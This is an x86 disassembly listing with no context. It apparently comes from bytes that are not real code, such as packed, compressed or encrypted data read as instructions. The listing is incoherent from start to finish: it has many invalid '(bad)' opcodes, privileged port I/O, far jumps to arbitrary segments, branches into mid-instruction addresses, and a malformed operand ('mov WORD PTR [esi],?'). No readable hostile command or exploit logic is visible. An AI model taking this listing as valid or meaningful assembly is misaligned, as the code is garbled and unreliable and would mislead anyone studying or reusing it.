  41485d:	test   al,0x40
  41485f:	nop
  414860:	lds    edx,FWORD PTR [eax]
  414862:	imul   edi,DWORD PTR cs:[ecx],0xffffffdb
  414866:	sbb    eax,0x52a7b8e0
  41486b:	cmp    BYTE PTR [edi-0x62e2ea36],dh
  414871:	jmp    0x8155:0x2a75d8e5
  414878:	mov    dl,0x6
  41487a:	pop    esp
  41487b:	adc    eax,0xac1fef73
  414880:	out    dx,al
  414881:	neg    DWORD PTR [ebp-0x1a]
  414884:	out    0xfc,eax
  414886:	sbb    BYTE PTR [ecx-0x9],0x88
  41488a:	mov    bh,0x42
  41488c:	push   ecx
  41488d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41488e:	mov    dh,0xfe
  414890:	les    ebp,FWORD PTR [eax+eiz*2]
  414893:	inc    ebx
  414894:	pop    esi
  414895:	aad    0x6b
  414897:	add    dh,ch
  414899:	dec    ecx
  41489a:	sbb    DWORD PTR cs:[edx],edx
  41489d:	cmp    eax,DWORD PTR [ecx+ebp*2+0x9a5042e]
  4148a4:	xor    DWORD PTR [ebp-0x7365f95f],0x55d89ce8
  4148ae:	mov    ebx,esp
  4148b0:	sbb    DWORD PTR [ebx],edi
  4148b2:	js     0x41483c
  4148b4:	(bad)  [eax-0x3261fff0]
  4148ba:	stos   DWORD PTR es:[edi],eax
  4148bb:	pushf  
  4148bc:	aam    0xc2
  4148be:	mov    edi,0xa4747766
  4148c3:	cmp    ebp,esp
  4148c5:	dec    esp
  4148c6:	mov    dh,0x5c
  4148c8:	push   edx
  4148c9:	jmp    0x34a7:0xafdaabbf
  4148d0:	pop    ecx
  4148d1:	adc    ebp,esp
  4148d3:	out    0x35,eax
  4148d5:	(bad)  
  4148d6:	scas   al,BYTE PTR es:[edi]
  4148d7:	js     0x4148d5
  4148d9:	dec    ecx
  4148da:	pushf  
  4148db:	pop    edx
  4148dc:	inc    esp
  4148dd:	push   esi
  4148de:	shr    DWORD PTR [edx],1
  4148e0:	mov    edi,0x5adb8464
  4148e5:	repnz mov esp,0x9cd43682
  4148eb:	in     eax,0x39
  4148ed:	lds    eax,FWORD PTR [edi-0x70]
  4148f0:	ds int 0xed
  4148f3:	iret   
  4148f4:	call   0xec8992bb
  4148f9:	fwait
  4148fa:	outs   dx,BYTE PTR ds:[esi]
  4148fb:	out    0x8a,al
  4148fd:	sub    BYTE PTR [ebp+0x7127f320],dh
  414903:	inc    edi
  414904:	cmp    esp,edi
  414906:	stos   BYTE PTR es:[edi],al
  414907:	cli    
  414908:	sahf   
  414909:	div    esi
  41490b:	call   0x8754849c
  414910:	test   ecx,ebx
  414912:	test   al,0x30
  414914:	and    DWORD PTR [edx],esp
  414916:	and    ch,BYTE PTR [ecx+0x419c0fa8]
  41491c:	test   al,0x6f
  41491e:	dec    ecx
  41491f:	jo     0x414918
  414921:	inc    eax
  414922:	adc    cl,BYTE PTR [edi+0xa]
  414925:	enter  0xe035,0x5b
  414929:	cmp    eax,0x2735c4f7
  41492e:	mov    ebp,0x4dfdaa18
  414933:	ss sbb al,0x8f
  414936:	sbb    eax,0x81ab93b8
  41493b:	aas    
  41493c:	call   0x8213c445
  414941:	push   ecx
  414942:	jl     0x4148e0
  414944:	mov    edi,0x7c87db9a
  414949:	sbb    al,0x4a
  41494b:	cld    
  41494c:	xor    esp,esp
  41494e:	jl     0x4148e8
  414950:	dec    ebp
  414951:	push   esi
  414952:	adc    al,0xe5
  414954:	sbb    DWORD PTR [eax-0x7d0644ca],0xffffffe0
  41495b:	mov    DWORD PTR [ebp+0x561db22c],ebx
  414961:	add    DWORD PTR [edx],0x3424581c
  414967:	scas   eax,DWORD PTR es:[edi]
  414968:	out    dx,al
  414969:	test   eax,0xfbf769d
  41496e:	out    0xe0,al
  414970:	push   cs
  414971:	ror    DWORD PTR [ebx+edx*1+0x5a],cl
  414975:	or     eax,0x9ed0f0c6
  41497a:	lahf   
  41497b:	push   esp
  41497c:	mul    BYTE PTR [edx]
  41497e:	jmp    0x255a52c8
  414983:	std    
  414984:	add    eax,0xbd597ec8
  414989:	push   ss
  41498a:	je     0x414914
  41498c:	(bad)  
  41498d:	adc    eax,0xa98c2c52
  414992:	dec    di
  414994:	cmp    DWORD PTR [eax-0x61],esp
  414997:	dec    edi
  414998:	fimul  DWORD PTR [ebp+ebp*4+0x486c1a37]
  41499f:	sub    BYTE PTR [eax],cl
  4149a1:	(bad)  
  4149a2:	or     bh,bh
  4149a4:	retf   
  4149a5:	inc    esi
  4149a6:	repnz or esp,DWORD PTR [eax-0x42a2bed9]
  4149ad:	push   es
  4149ae:	jae    0x4149f7
  4149b0:	inc    ebp
  4149b1:	mov    dl,0x87
  4149b3:	inc    edx
  4149b4:	push   eax
  4149b5:	jo     0x4149c0
  4149b7:	aad    0x82
  4149b9:	push   eax
  4149ba:	ret    0x38db
  4149bd:	(bad)  
  4149be:	repz add DWORD PTR [esi],ecx
  4149c1:	out    dx,al
  4149c2:	aad    0x9
  4149c4:	mov    ecx,ebx
  4149c6:	push   0xffffffe0
  4149c8:	inc    ecx
  4149c9:	imul   edi,DWORD PTR [edi],0x2
  4149cc:	cmp    edi,ebx
  4149ce:	push   edx
  4149cf:	jmp    0x83ac:0x9e13fc03
  4149d6:	xchg   ebp,eax
  4149d7:	ins    BYTE PTR es:[edi],dx
  4149d8:	xor    ebp,ebx
  4149da:	xor    ebp,DWORD PTR [edi+0x50]
  4149dd:	std    
  4149de:	stos   DWORD PTR es:[edi],eax
  4149df:	ret    0xdca5
  4149e2:	inc    esi
  4149e3:	mov    al,ds:0xdfc33a3f
  4149e8:	push   ebx
  4149e9:	call   0x7edb059c
  4149ee:	jae    0x414a6a
  4149f0:	push   ebx
  4149f1:	into   
  4149f2:	jb     0x414a11
  4149f4:	neg    DWORD PTR [eax]
  4149f6:	dec    edi
  4149f7:	sub    BYTE PTR [esi-0x2644adc5],cl
  4149fd:	sbb    ecx,DWORD PTR [eax+0x6b]
  414a00:	pop    esp
  414a01:	in     al,dx
  414a02:	sahf   
  414a03:	jmp    0x53155718
  414a08:	mov    ds,ecx
  414a0a:	inc    esp
  414a0b:	ret    0x7666
  414a0e:	sub    dl,ch
  414a10:	fucom  st(2)
  414a12:	aas    
  414a13:	nop
  414a14:	pop    eax
  414a15:	fild   WORD PTR [ecx-0x5e]
  414a18:	es popa 
  414a1a:	mov    esp,0x5d54bf92
  414a1f:	sub    dl,BYTE PTR ds:[ecx+0x2b]
  414a23:	repnz push ss
  414a25:	loope  0x414a6c
  414a27:	pushf  
  414a28:	rcl    BYTE PTR [edi],cl
  414a2a:	jg     0x414a56
  414a2c:	xor    eax,0x722ff1d1
  414a31:	cld    
  414a32:	inc    ebx
  414a33:	xchg   esp,eax
  414a34:	mov    ss,WORD PTR [ebx]
  414a36:	sti    
  414a37:	push   0x748e7052
  414a3c:	in     eax,dx
  414a3d:	es int 0xc1
  414a40:	inc    edi
  414a41:	xchg   edi,edi
  414a43:	icebp  
  414a44:	dec    eax
  414a45:	shl    dl,1
  414a47:	iret   
  414a48:	cmp    ch,cl
  414a4a:	add    esp,DWORD PTR [ebp+0x4822eb51]
  414a50:	sub    eax,0xc925a8d7
  414a55:	xchg   ebp,eax
  414a56:	sub    ah,al
  414a58:	(bad)  
  414a59:	xor    bl,ah
  414a5b:	pop    edi
  414a5c:	cli    
  414a5d:	sti    
  414a5e:	cli    
  414a5f:	(bad)  
  414a60:	lods   eax,DWORD PTR ds:[esi]
  414a61:	stos   DWORD PTR es:[edi],eax
  414a62:	bound  edi,QWORD PTR [ecx+0x53]
  414a65:	push   edx
  414a66:	loope  0x414a9c
  414a68:	push   ebp
  414a69:	sbb    DWORD PTR [ebp-0x2f],eax
  414a6c:	jns    0x414a21
  414a6e:	cmp    edi,ebp
  414a70:	cmp    al,0xd0
  414a72:	jmp    0x898c:0xa3b0767b
  414a79:	push   0xffffffdf
  414a7b:	cs xchg edi,eax
  414a7d:	shl    DWORD PTR [ecx+0x73],cl
  414a80:	dec    DWORD PTR [eax+eiz*8+0x561111ab]
  414a87:	ret    0xfd02
  414a8a:	dec    eax
  414a8b:	push   esp
  414a8c:	mov    ecx,0xcba28dd8
  414a91:	fisttp WORD PTR [esp+ebx*8-0x1da66d43]
  414a98:	fiadd  WORD PTR [edx+0x3f2fd079]
  414a9e:	test   BYTE PTR [edi+0x31487aee],0x9d
  414aa5:	add    ecx,DWORD PTR [eax]
  414aa7:	out    0xee,al
  414aa9:	cmp    ebx,DWORD PTR [ecx+0x13cdab4d]
  414aaf:	cli    
  414ab0:	test   DWORD PTR [esi-0x6ff9bcef],edx
  414ab6:	push   eax
  414ab7:	dec    edi
  414ab8:	test   ah,0x7a
  414abb:	sub    al,0x62
  414abd:	cld    
  414abe:	test   BYTE PTR [eax],cl
  414ac0:	cmp    ch,BYTE PTR [esi]
  414ac2:	pop    edi
  414ac3:	iret   
  414ac4:	test   al,0xd8
  414ac6:	test   al,0x3a
  414ac8:	loop   0x414b1c
  414aca:	xchg   BYTE PTR [ebx],bh
  414acc:	retf   
  414acd:	xlat   BYTE PTR ds:[ebx]
  414ace:	mov    ds:0x79030bfe,eax
  414ad3:	xor    ecx,DWORD PTR [esi-0x168d061a]
  414ad9:	(bad)  
  414adb:	fs inc esp
  414add:	mov    esp,DWORD PTR [ecx-0x23970532]
  414ae3:	fimul  WORD PTR [ebx-0x16684761]
  414ae9:	jbe    0x414ae9
  414aeb:	xor    DWORD PTR [eax-0x66],eax
  414aee:	add    al,0xf2
  414af0:	mov    bh,0xb5
  414af2:	test   al,0x8b
  414af4:	dec    ebx
  414af5:	lods   al,BYTE PTR ds:[esi]
  414af6:	stos   DWORD PTR es:[edi],eax
  414af7:	cs sub esi,ebp
  414afa:	call   0x82264fc1
  414aff:	icebp  
  414b00:	add    BYTE PTR [ecx+0x5a394757],dl
  414b06:	jae    0x414ab4
  414b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b09:	test   eax,0x9fe6d654
  414b0e:	mov    dl,0xb1
  414b10:	dec    esi
  414b11:	scas   eax,DWORD PTR es:[edi]
  414b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b13:	mov    ecx,DWORD PTR [esi-0x5a251902]
  414b19:	sub    BYTE PTR [eax+0x56f61fcf],bh
  414b1f:	mov    ebx,ecx
  414b21:	cdq    
  414b22:	and    eax,0xf49939c5
  414b27:	mov    ch,0x82
  414b29:	ds or  bl,dh
  414b2c:	push   es
  414b2d:	push   0x92d9ea03
  414b32:	retf   0x3365
  414b35:	sub    BYTE PTR [esi-0xc],cl
  414b38:	mov    al,ds:0x53043750
  414b3d:	addr16 adc ch,dl
  414b40:	xchg   al,ah
  414b42:	dec    edi
  414b43:	leave  
  414b44:	push   ebx
  414b45:	cmp    al,ch
  414b47:	sahf   
  414b48:	ret    0xd7f3
  414b4b:	adc    eax,0x89ab991d
  414b50:	xchg   esp,eax
  414b51:	addr16 jl 0x414b94
  414b54:	das    
  414b55:	stos   BYTE PTR es:[edi],al
  414b56:	mov    cl,0x13
  414b58:	inc    ecx
  414b59:	and    DWORD PTR [edx-0x3120a8a3],edx
  414b5f:	inc    ebp
  414b60:	mov    eax,ds:0x88726afc
  414b65:	xor    edi,ecx
  414b67:	test   al,0x17
  414b69:	push   ebp
  414b6a:	mov    DWORD PTR [eax],ecx
  414b6c:	lahf   
  414b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b6e:	mov    dh,BYTE PTR [edi]
  414b70:	mov    eax,0x7320a194
  414b75:	sub    dl,BYTE PTR [edi-0x56]
  414b78:	pop    ss
  414b79:	scas   eax,DWORD PTR es:[edi]
  414b7a:	les    ecx,FWORD PTR [edi+0x29dc7127]
  414b80:	sbb    eax,0xffe4748d
  414b85:	mov    eax,0xaa1c9271
  414b8a:	cmp    BYTE PTR [ebp-0x701eb709],cl
  414b90:	shr    DWORD PTR [esi],0x18
  414b93:	sub    dh,BYTE PTR [eax+ebx*4-0x180330d3]
  414b9a:	dec    DWORD PTR [ebx]
  414b9c:	sub    DWORD PTR [eax-0x45d9ee3f],0x3e59878
  414ba6:	aam    0x58
  414ba8:	dec    ecx
  414ba9:	jmp    0xa4c4e195
  414bae:	(bad)  
  414baf:	sub    eax,0xa0bde46a
  414bb4:	int3   
  414bb5:	jae    0x414c01
  414bb7:	stc    
  414bb8:	stos   BYTE PTR es:[edi],al
  414bb9:	fsubp  st(3),st
  414bbb:	cld    
  414bbc:	sub    eax,DWORD PTR [edi-0x55]
  414bbf:	imul   ecx,edx,0x9b0a78c4
  414bc5:	les    edi,FWORD PTR [ebx+0x2105cd11]
  414bcb:	mov    esi,0xfe3502bf
  414bd0:	jbe    0x414bab
  414bd2:	ss jp  0x414c43
  414bd5:	fcom   DWORD PTR [esi+ecx*2-0x74fa948]
  414bdc:	fnstenv [ebx+0x74]
  414bdf:	lds    edi,FWORD PTR [edx+edx*4]
  414be2:	pop    ss
  414be3:	sub    al,0xe1
  414be5:	gs aaa 
  414be7:	frstor [esi-0x7b34d632]
  414bed:	inc    edx
  414bee:	sbb    edx,esp
  414bf0:	(bad)  
  414bf1:	lods   al,BYTE PTR ds:[esi]
  414bf2:	mov    ecx,0x2ba40771
  414bf7:	js     0x414c2e
  414bf9:	aad    0x6c
  414bfb:	data16 cmc 
  414bfd:	sti    
  414bfe:	dec    ebp
  414bff:	fwait
  414c00:	pop    ds
  414c01:	sub    eax,DWORD PTR [ebp-0x1a]
  414c04:	mov    eax,0x6947e183
  414c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c0a:	push   edi
  414c0b:	sbb    DWORD PTR ds:0x8d94bf92,esi
  414c11:	or     ebp,eax
  414c13:	push   ds
  414c14:	mov    ds:0x48c7c8aa,eax
  414c19:	mov    ah,0xfd
  414c1b:	push   edi
  414c1c:	aam    0x87
  414c1e:	mov    ss:0x2089b66c,al
  414c24:	arpl   WORD PTR [eax],sp
  414c26:	cmp    eax,ebx
  414c28:	mov    al,0xcd
  414c2a:	sub    eax,0x7c8d423b
  414c2f:	leave  
  414c30:	push   ecx
  414c31:	sub    DWORD PTR [ebp-0x116e7ef4],esi
  414c37:	mov    ebp,0x36709538
  414c3c:	test   DWORD PTR [eax],0xf670d51b
  414c42:	int3   
  414c43:	cwde   
  414c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c45:	scas   eax,DWORD PTR es:[edi]
  414c46:	enter  0xa9cc,0xd
  414c4a:	jg     0x414bde
  414c4c:	and    dl,BYTE PTR [edx+eax*1+0x4c]
  414c50:	sbb    al,ch
  414c52:	cmp    DWORD PTR [esi-0x5f],ebp
  414c55:	jb     0x414c7b
  414c57:	test   eax,0x5393b40d
  414c5c:	sub    cl,ah
  414c5e:	push   ds
  414c5f:	and    bl,BYTE PTR [eax-0xe]
  414c62:	popa   
  414c63:	mov    esi,0xd6047f5c
  414c68:	enter  0x8368,0xdf
  414c6c:	ds xor eax,0x752df170
  414c72:	lds    edx,FWORD PTR [esi-0x3da48d26]
  414c78:	out    dx,al
  414c79:	mov    esp,0x5da56c63
  414c7e:	inc    eax
  414c7f:	mov    ch,0x81
  414c81:	sahf   
  414c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c83:	jno    0x414c31
  414c85:	jno    0x414c51
  414c87:	int    0x34
  414c89:	fbld   TBYTE PTR ds:0x6b390ec4
  414c8f:	jmp    0x414caf
  414c91:	mov    WORD PTR [ecx-0x35],es
  414c94:	cmp    ebx,DWORD PTR [esi+esi*1+0x4f]
	...
  414d13:	add    BYTE PTR [ecx],dl
  414d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d16:	pop    esi
  414d17:	xor    eax,0xa57bfffe
  414d1c:	int    0xa1
  414d1e:	ficom  WORD PTR [esi+edi*1+0x5]
  414d22:	adc    al,BYTE PTR [eax]
  414d24:	xor    ebx,esi
  414d26:	add    BYTE PTR [eax],al
  414d28:	ins    BYTE PTR es:[edi],dx
  414d29:	pop    es
  414d2a:	add    BYTE PTR [eax],al
  414d2c:	push   es
  414d2d:	cs and eax,0x1afac3f8
  414d33:	adc    cl,BYTE PTR [esi]
  414d35:	xchg   esi,eax
  414d36:	sbb    dh,cl
  414d38:	ds in  eax,dx
  414d3a:	xor    DWORD PTR [ebp+esi*1+0x0],esi
  414d3e:	rcr    BYTE PTR [eax],cl
  414d40:	rol    ecx,1
  414d42:	mov    DWORD PTR [ebx+0x7a0099f1],ecx
  414d48:	xor    ch,dh
  414d4a:	mov    edi,0x1fba0f51
  414d4f:	stc    
  414d50:	gs into 
  414d52:	and    al,0xc8
  414d54:	mov    ds:0xbb2456c3,al
  414d59:	loop   0x414cf9
  414d5b:	push   edi
  414d5c:	inc    ebx
  414d5d:	mov    ax,ds:0x2748a985
  414d63:	push   ds
  414d64:	xchg   edi,eax
  414d65:	add    esi,DWORD PTR [esi]
  414d67:	fimul  DWORD PTR [ebx+0x75]
  414d6a:	call   0x82d9:0xd1e6f49e
  414d71:	mov    bh,BYTE PTR [esi]
  414d73:	mov    dh,BYTE PTR [edi-0x63076e32]
  414d79:	pop    edx
  414d7a:	mov    DWORD PTR [edi-0x4677b8dc],0xef1b2daa
  414d84:	rcl    BYTE PTR [esp+eax*2+0x48],cl
  414d88:	xchg   esi,eax
  414d89:	rep outs dx,BYTE PTR ds:[esi]
  414d8b:	mov    edi,0x37288907
  414d90:	add    esi,DWORD PTR [edx]
  414d92:	adc    eax,0x7559052b
  414d97:	test   DWORD PTR [ecx+0x56],edx
  414d9a:	inc    ebx
  414d9b:	push   0x27b785fe
  414da0:	mov    dl,0xc
  414da2:	sub    DWORD PTR [edx],edi
  414da4:	sahf   
  414da5:	jne    0x414dda
  414da7:	inc    ebx
  414da8:	les    edx,FWORD PTR [ebp+0x52c198cc]
  414dae:	and    al,0x86
  414db0:	mov    al,0x87
  414db2:	xor    BYTE PTR [ebx],al
  414db4:	xor    DWORD PTR [esi-0xdc5ac2d],ebx
  414dba:	mov    eax,0x9c8ed4b7
  414dbf:	test   al,0xd7
  414dc1:	add    al,0x72
  414dc3:	or     BYTE PTR [bx-0x7a],0xe6
  414dc8:	xchg   esi,eax
  414dc9:	jb     0x414d62
  414dcb:	mov    eax,ds:0x6669dc9a
  414dd0:	mov    ah,0x6b
  414dd2:	mov    WORD PTR [esi],?
  414dd4:	or     al,0xbe
  414dd6:	call   0xa2e6:0x812d1531
  414ddd:	enter  0xb68e,0x88
  414de1:	inc    eax
  414de2:	nop
  414de3:	jns    0x414d6e
  414de5:	call   0xc116:0x9fe9ec0a
  414dec:	jmp    0x7e3ae9bd
  414df1:	and    al,0xd5
  414df3:	push   ebp
  414df4:	xchg   BYTE PTR [edi],dh
  414df6:	add    edx,esp
  414df8:	stos   DWORD PTR es:[edi],eax
  414df9:	es retf 
  414dfb:	add    cl,BYTE PTR [ebx-0x3656cb04]
  414e01:	xchg   BYTE PTR [ecx],al
  414e03:	lods   eax,DWORD PTR ds:[esi]
  414e04:	test   eax,0x777cba90
  414e09:	pop    esi
  414e0a:	je     0x414de8
  414e0c:	in     eax,0x99
  414e0e:	or     ch,bl
  414e10:	jns    0x414e75
  414e12:	mov    bh,0x9b
  414e14:	std    
  414e15:	ins    BYTE PTR es:[edi],dx
  414e16:	sahf   
  414e17:	mov    ah,0x7f
  414e19:	mov    dh,0x43
  414e1b:	sub    BYTE PTR [ebx+0x7f],al
  414e1e:	push   ebx
  414e1f:	mov    dh,0x42
  414e21:	rcr    ch,cl
  414e23:	sub    eax,0x79b2e10f
  414e28:	pop    ecx
  414e29:	cwde   
  414e2a:	jecxz  0x414e37
  414e2c:	inc    ecx
  414e2d:	inc    ebp
  414e2e:	outs   dx,BYTE PTR ds:[esi]
  414e2f:	test   al,0x41
  414e31:	daa    
  414e32:	arpl   WORD PTR [edx],sp
  414e34:	xor    eax,ecx
  414e36:	sub    eax,0x271c6b83
  414e3b:	xor    eax,0x2613c576
  414e40:	dec    esp
  414e41:	inc    edx
  414e42:	push   0xa506acb4
  414e47:	ins    BYTE PTR es:[edi],dx
  414e48:	std    
  414e49:	adc    ch,dl
  414e4b:	mov    ds:0xffa0086b,eax
  414e50:	sub    dh,BYTE PTR ds:0x80602ef0
  414e56:	lea    esi,[esi-0x59]
  414e59:	adc    ecx,DWORD PTR [eax+0x1c606c6e]
  414e5f:	ffree  st(1)
  414e61:	jb     0x414df4
  414e63:	mov    BYTE PTR [ebx+0x8a1d60f],al
  414e69:	fxch   st(4)
  414e6b:	mov    dl,0x48
  414e6d:	adc    al,0x65
  414e6f:	pop    edi
  414e70:	jge    0x414e4d
  414e72:	sub    DWORD PTR [ebx-0x2a41ddab],edx
  414e78:	and    ebx,edi
  414e7a:	mov    eax,0x313a11dd
  414e7f:	sub    al,0x46
  414e81:	aam    0x69
  414e83:	in     eax,0xd6
  414e85:	inc    edx
  414e86:	push   es
  414e87:	call   0x5c12eb05
  414e8c:	pop    ebp
  414e8d:	gs int 0xb9
  414e90:	mov    DWORD PTR [esi+0x5801c1d4],ebp
  414e96:	sbb    bh,ch
  414e98:	inc    esi
  414e99:	arpl   WORD PTR [ecx+ecx*1-0x1332097e],ax
  414ea0:	mov    ch,0x99
  414ea2:	mov    esi,DWORD PTR [eax+edi*4-0x16bcbe25]
  414ea9:	bound  esi,QWORD PTR ss:[edi-0x26]
  414ead:	inc    esi
  414eae:	scas   eax,DWORD PTR es:[edi]
  414eaf:	push   ds
  414eb0:	jne    0x414e87
  414eb2:	jecxz  0x414f11
  414eb4:	jge    0x414ee8
  414eb6:	push   edi
  414eb7:	and    ebx,DWORD PTR [edx+eiz*8-0x45d9090b]
  414ebe:	mov    cl,0x8
  414ec0:	lds    esi,FWORD PTR [eax-0x67e36641]
  414ec6:	shr    DWORD PTR [eax-0x1f],cl
  414ec9:	inc    esi
  414eca:	pop    ds
  414ecb:	push   eax
  414ecc:	retf   0xd45b
  414ecf:	push   ebp
  414ed0:	cmp    eax,0x419ba33a
  414ed5:	pop    edi
  414ed6:	ins    BYTE PTR es:[edi],dx
  414ed7:	test   eax,0xcfa3234f
  414edc:	push   0x640b7bba
  414ee1:	lea    ecx,[edi-0x5d]
  414ee4:	mov    gs,ecx
  414ee6:	xlat   BYTE PTR ds:[ebx]
  414ee7:	mov    ebp,DWORD PTR [esi-0x75]
  414eea:	sub    bl,al
  414eec:	xchg   esi,eax
  414eed:	(bad)  
  414eee:	test   edi,0xed77da9e
  414ef4:	add    BYTE PTR [esi-0x54],al
  414ef7:	jne    0x414f4e
  414ef9:	add    al,0x92
  414efb:	fsubr  st(1),st
  414efd:	rcr    DWORD PTR [eax-0x62],cl
  414f00:	stos   BYTE PTR es:[edi],al
  414f01:	jae    0x414f3a
  414f03:	mov    ah,0x19
  414f05:	push   0xffffffcf
  414f07:	fs mov bh,0xdd
  414f0a:	xlat   BYTE PTR ds:[ebx]
  414f0b:	xchg   ebx,eax
  414f0c:	adc    ebp,DWORD PTR [ecx-0x3e]
  414f0f:	bound  ebx,QWORD PTR [edi]
  414f11:	leave  
  414f12:	mov    edi,0xbd10be52
  414f17:	mov    ecx,0xb86ff95
  414f1c:	pop    ebp
  414f1d:	cmp    ch,dl
  414f1f:	in     eax,0xde
  414f21:	scas   al,BYTE PTR es:[edi]
  414f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f24:	dec    eax
  414f25:	fcom   QWORD PTR [ebx-0x42aa6fe6]
  414f2b:	mov    edi,0x3997adf4
  414f30:	ins    DWORD PTR es:[edi],dx
  414f31:	aas    
  414f32:	aam    0x90
  414f34:	mov    bh,0xbd
  414f36:	retf   0x6b1e
  414f39:	popf   
  414f3a:	mov    al,0x83
  414f3c:	sbb    DWORD PTR [esi+0x7480b4ec],eax
  414f42:	dec    edx
  414f43:	sti    
  414f44:	and    bl,BYTE PTR [esi-0x7bd6416a]
  414f4a:	push   eax
  414f4b:	mov    esp,0x524d2cde
  414f50:	test   al,0x7b
  414f52:	add    esi,eax
  414f54:	inc    esi
  414f55:	js     0x414f3b
  414f57:	push   ebx
  414f58:	jbe    0x414f67
  414f5a:	outs   dx,BYTE PTR ds:[esi]
  414f5b:	jecxz  0x414fcf
  414f5d:	int    0x54
  414f5f:	repnz fbld TBYTE PTR [esi-0x21]
  414f63:	sub    ecx,esp
  414f65:	pop    esi
  414f66:	shl    BYTE PTR [esp+esi*2-0x507f602b],0xee
  414f6e:	mov    BYTE PTR [edi+0x40187048],ah
  414f74:	arpl   WORD PTR [ebx+0x4bb6f58b],ax
  414f7a:	or     BYTE PTR [edi+eax*1-0x1],bl
  414f7e:	dec    ecx
  414f7f:	xchg   ebx,eax
  414f80:	and    eax,ecx
  414f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f83:	fst    DWORD PTR [esp+edx*2-0x7b]
  414f87:	cmp    eax,0x383bac1b
  414f8c:	repz ret 0xb6f9
  414f90:	outs   dx,DWORD PTR ds:[esi]
  414f91:	dec    edi
  414f92:	mov    esp,0x1788dd65
  414f97:	adc    edx,DWORD PTR [ebx-0x13800818]
  414f9d:	data16 fimul DWORD PTR [esi+0x79f95780]
  414fa4:	fisub  WORD PTR [eax+0x6]
  414fa7:	enter  0x461c,0x23
  414fab:	js     0x414fd2
  414fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fae:	daa    
  414faf:	outs   dx,DWORD PTR ds:[esi]
  414fb0:	inc    esp
  414fb1:	pop    es
  414fb2:	sbb    DWORD PTR [edx-0x22714dc3],ebp
  414fb8:	(bad)  
  414fb9:	xlat   BYTE PTR ds:[ebx]
  414fba:	xchg   esp,eax
  414fbb:	fisubr DWORD PTR [eax+0x11]
  414fbe:	dec    esi
  414fbf:	cli    
  414fc0:	retf   
  414fc1:	es sbb edi,edx
  414fc4:	jne    0x414f46
  414fc6:	aad    0xb9
  414fc8:	fisub  WORD PTR [ecx]
  414fca:	cmc    
  414fcb:	mov    ecx,0x379ce6bb
  414fd0:	scas   eax,DWORD PTR es:[edi]
  414fd1:	test   ch,bl
  414fd3:	xlat   BYTE PTR ds:[ebx]
  414fd4:	cwde   
  414fd5:	clc    
  414fd6:	jge    0x414fbe
  414fd8:	push   eax
  414fd9:	retf   0x5f3c
  414fdc:	cmp    eax,0xfcd82efa
  414fe1:	xor    DWORD PTR [ecx+0x5c],0x29
  414fe5:	out    dx,al
  414fe6:	loop   0x414f9b
  414fe8:	test   al,0x54
  414fea:	push   esi
  414feb:	sub    DWORD PTR [ebp+0x288376bc],esi
  414ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff3:	sub    al,0xf3
  414ff5:	test   DWORD PTR [eax],ebx
  414ff7:	pop    esp
  414ff8:	icebp  
  414ff9:	scas   eax,DWORD PTR es:[edi]
  414ffa:	mov    cl,0x2
  414ffc:	inc    eax
  414ffd:	jmp    0xe98a:0x4cf3143f
  415004:	lods   al,BYTE PTR ds:[esi]
  415005:	nop
  415006:	repnz cmp eax,0xd5808b29
  41500c:	fsubp  st(3),st
  41500e:	inc    ebx
  41500f:	inc    ebx
  415010:	push   ecx
  415011:	shr    BYTE PTR [ecx-0x5a],1
  415014:	mov    BYTE PTR [ebx-0x142006cc],bl
  41501a:	test   ah,0x10
  41501d:	mov    cs,WORD PTR [edx-0x13]
  415020:	mov    bh,0xbd
  415022:	fsubr  st,st(4)
  415024:	mov    bh,0xfe
  415026:	jae    0x414ff2
  415028:	inc    ecx
  415029:	mov    BYTE PTR [edx],dh
  41502b:	je     0x414ff6
  41502d:	in     al,0x6a
  41502f:	push   cs
  415030:	dec    eax
  415031:	and    eax,0xe4fdbbfa
  415036:	dec    ebx
  415037:	or     ebx,esi
  415039:	mov    ss,WORD PTR [eax+0x5c]
  41503c:	and    bh,BYTE PTR [esi+0x15]
  41503f:	sar    BYTE PTR [ecx+0x44a4db0a],1
  415045:	popf   
  415046:	or     BYTE PTR [ecx-0x2158e633],0xa4
  41504d:	and    eax,edi
  41504f:	inc    ebx
  415050:	out    0xde,al
  415052:	stos   BYTE PTR es:[edi],al
  415053:	pop    edx
  415054:	ss mov edi,0x4cccd582
  41505a:	or     eax,0x321c0788
  41505f:	add    cl,BYTE PTR [edx]
  415061:	hlt    
  415062:	xor    esp,esi
  415064:	jno    0x4150e3
  415066:	xchg   edx,eax
  415067:	sbb    al,0xc1
  415069:	clc    
  41506a:	ja     0x4150de
  41506c:	pop    ebx
  41506d:	mov    edi,0xb55748b7
  415072:	inc    esi
  415073:	pop    ebx
  415074:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415076:	mov    bh,dl
  415078:	ret    0xd101
  41507b:	loopne 0x41503c
  41507d:	call   0x19be:0x9a3b6e2d
  415084:	ret    
  415085:	pusha  
  415086:	lahf   
  415087:	or     BYTE PTR [edi],cl
  415089:	add    eax,0x7c332279
  41508e:	xchg   ebp,eax
  41508f:	jnp    0x4150d2
  415091:	sub    edx,DWORD PTR [edx]
  415093:	ror    BYTE PTR [eax+0x7c],0x1f
  415097:	out    0x61,al
  415099:	pop    esp
  41509a:	xor    esi,DWORD PTR [ecx+0x56]
  41509d:	cli    
  41509e:	(bad)  
  4150a0:	mov    bh,0x28
  4150a2:	adc    DWORD PTR [edi],ebp
  4150a4:	cmp    al,0xa7
  4150a6:	and    ch,BYTE PTR [edx]
  4150a8:	lods   eax,DWORD PTR ds:[esi]
  4150a9:	icebp  
  4150aa:	shl    BYTE PTR [ebx],0x7
  4150ad:	stc    
  4150ae:	adc    eax,0x32325fb2
  4150b3:	iret   
